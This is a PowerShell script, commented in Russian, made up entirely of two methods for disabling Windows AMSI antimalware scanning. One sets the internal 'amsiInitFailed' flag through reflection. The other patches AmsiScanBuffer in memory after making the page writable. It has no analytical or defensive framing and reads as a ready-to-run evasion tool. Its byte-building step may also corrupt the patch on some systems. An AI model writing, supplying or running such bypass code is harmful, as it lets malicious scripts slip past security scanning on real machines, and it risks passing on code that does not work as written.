# 1. Nullify AMSI context через .NET reflection
function Bypass-AMSI {
    $Ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($Ref) {
        $Ref.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
    }
}

# 2. Memory patch AmsiScanBuffer (обновленный на 2026)
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, 
        uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$amsiDll = [Win32]::LoadLibrary("amsi.dll")
$scanAddr = [Win32]::GetProcAddress($amsiDll, "AmsiScanBuffer")

# Патчим: mov eax, 0x80070057 ; ret (HRESULT для E_INVALIDARG)
[Byte[]]$Patch = [System.Text.Encoding]::Default.GetBytes(
    [char[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3))
$oldProtect = 0
[Win32]::VirtualProtect($scanAddr, [UIntPtr]6, 0x40, [ref]$oldProtect) # PAGE_EXECUTE_READWRITE
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $scanAddr, 6)
[Win32]::VirtualProtect($scanAddr, [UIntPtr]6, $oldProtect, [ref]$oldProtect)
